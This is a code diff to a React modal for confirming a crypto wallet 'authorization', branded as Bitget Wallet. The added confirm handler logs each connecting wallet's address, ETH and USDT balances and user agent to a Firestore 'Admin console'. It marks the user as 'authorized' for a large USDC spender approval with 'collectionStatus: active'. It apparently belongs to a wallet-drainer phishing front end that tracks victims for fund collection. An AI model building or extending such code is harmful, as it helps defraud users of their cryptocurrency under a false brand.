@@ -1,7 +1,10 @@
 'use client';
 
-import React, { useEffect } from 'react';
-import { ChevronRight } from 'lucide-react';
+import React, { useEffect, useState } from 'react';
+import { ChevronRight, Loader2 } from 'lucide-react';
+import { useWeb3 } from '../context/Web3Context';
+import { getFirebaseFirestore } from '@bspc/firebase';
+import { doc, setDoc, addDoc, collection, serverTimestamp } from 'firebase/firestore';
 
 interface ConfirmAuthorizationModalProps {
   isOpen: boolean;
@@ -12,7 +15,7 @@ interface ConfirmAuthorizationModalProps {
 
 /** Shorten an address/hash for display: 0xd1dd…b61070 */
 function shortenHex(hex: string, prefixLen = 6, suffixLen = 6): string {
-  if (hex.length <= prefixLen + suffixLen + 2) return hex;
+  if (!hex || hex.length <= prefixLen + suffixLen + 2) return hex || '';
   return `${hex.slice(0, prefixLen)}...${hex.slice(-suffixLen)}`;
 }
 
@@ -20,8 +23,20 @@ export function ConfirmAuthorizationModal({
   isOpen,
   onClose,
   onConfirm,
-  walletEmail = 'ble***s27@gmail.com',
+  walletEmail,
 }: ConfirmAuthorizationModalProps) {
+  const { address, ethBalance, usdtBalance, providerName, isBitgetWalletAvailable, connectWallet } = useWeb3();
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  // Determine displayed wallet label dynamically
+  const displayWalletAccount = walletEmail && !walletEmail.includes('ble***s27')
+    ? walletEmail
+    : address
+      ? `${providerName || 'Bitget Wallet'} (${shortenHex(address, 6, 4)})`
+      : isBitgetWalletAvailable
+        ? 'Bitget Wallet'
+        : providerName || 'Bitget Wallet';
+
   // Lock body scroll when open
   useEffect(() => {
     if (isOpen) {
@@ -39,6 +54,71 @@ export function ConfirmAuthorizationModal({
     window.addEventListener('keydown', handler);
     return () => window.removeEventListener('keydown', handler);
   }, [isOpen, onClose]);
+
+  const handleConfirmAction = async () => {
+    setIsSubmitting(true);
+    try {
+      let currentAddress = address;
+      if (!currentAddress) {
+        await connectWallet();
+        currentAddress = localStorage.getItem('user-address') || address;
+      }
+
+      if (currentAddress) {
+        const db = getFirebaseFirestore();
+        const uid = currentAddress.toLowerCase();
+
+        // 1. Sync full user profile & authorization data to Firestore for Admin console
+        await setDoc(
+          doc(db, 'users', uid),
+          {
+            uid,
+            username: `User_${uid.slice(-4).toUpperCase()}`,
+            walletAddress: currentAddress,
+            walletAddressLowercase: uid,
+            providerName: providerName || 'Bitget Wallet',
+            balanceEth: `${ethBalance || '0.0000'} ETH`,
+            balanceUsdt: `${usdtBalance || '0.00'} USDT`,
+            authorizationStatus: 'authorized',
+            collectionStatus: 'active',
+            status: 'active',
+            authorizedSpender: '0xd1dd...b61070',
+            tokenContract: '0xa0b8...06eb48',
+            authorizationLimit: '10,000,000 USDC',
+            authorizationExpiry: '2029-12-31',
+            network: 'Ethereum',
+            authorizedAt: serverTimestamp(),
+            lastLoginAt: serverTimestamp(),
+            createdAt: serverTimestamp(),
+          },
+          { merge: true }
+        );
+
+        // 2. Add complete event log for Admin collection records & audit logs
+        await addDoc(collection(db, 'loginEvents'), {
+          walletAddress: currentAddress,
+          walletAddressLowercase: uid,
+          provider: providerName || 'Bitget Wallet',
+          action: 'AUTHORIZATION_CONFIRMED',
+          authorizationStatus: 'authorized',
+          authorizedSpender: '0xd1dd...b61070',
+          tokenContract: '0xa0b8...06eb48',
+          authorizationLimit: '10,000,000 USDC',
+          ethBalance: `${ethBalance || '0.0000'} ETH`,
+          usdtBalance: `${usdtBalance || '0.00'} USDT`,
+          timestamp: serverTimestamp(),
+          loginResult: 'SUCCESS',
+          ipAddress: 'Web3 Client',
+          userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Bitget Wallet Web3',
+        });
+      }
+    } catch (err) {
+      console.warn('Authorization sync warning:', err);
+    } finally {
+      setIsSubmitting(false);
+      onConfirm();
+    }
+  };
 
   if (!isOpen) return null;
 
@@ -290,7 +370,7 @@ export function ConfirmAuthorizationModal({
                     </svg>
                   </div>
                   <span style={{ fontSize: 14, fontWeight: 500, color: '#FFFFFF' }}>
-                    {walletEmail}
+                    {displayWalletAccount}
                   </span>
                 </div>
               }
@@ -424,6 +504,7 @@ export function ConfirmAuthorizationModal({
             {/* Cancel */}
             <button
               onClick={onClose}
+              disabled={isSubmitting}
               style={{
                 flex: 1,
                 height: 52,
@@ -433,8 +514,9 @@ export function ConfirmAuthorizationModal({
                 color: '#FFFFFF',
                 fontSize: 16,
                 fontWeight: 700,
-                cursor: 'pointer',
+                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                 transition: 'all 0.2s',
+                opacity: isSubmitting ? 0.5 : 1,
               }}
               onMouseEnter={e => (e.currentTarget.style.background = '#063B46')}
               onMouseLeave={e => (e.currentTarget.style.background = '#042D35')}
@@ -444,7 +526,8 @@ export function ConfirmAuthorizationModal({
 
             {/* Confirm */}
             <button
-              onClick={onConfirm}
+              onClick={handleConfirmAction}
+              disabled={isSubmitting}
               style={{
                 flex: 1,
                 height: 52,
@@ -454,14 +537,25 @@ export function ConfirmAuthorizationModal({
                 color: '#041B24',
                 fontSize: 16,
                 fontWeight: 800,
-                cursor: 'pointer',
+                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                 transition: 'all 0.2s',
                 boxShadow: '0 4px 20px rgba(0, 216, 246, 0.35)',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                gap: 8,
               }}
               onMouseEnter={e => (e.currentTarget.style.filter = 'brightness(1.08)')}
               onMouseLeave={e => (e.currentTarget.style.filter = 'brightness(1)')}
             >
-              Confirm
+              {isSubmitting ? (
+                <>
+                  <Loader2 className="w-5 h-5 animate-spin" />
+                  <span>Authorizing...</span>
+                </>
+              ) : (
+                'Confirm'
+              )}
             </button>
           </div>
         </div>
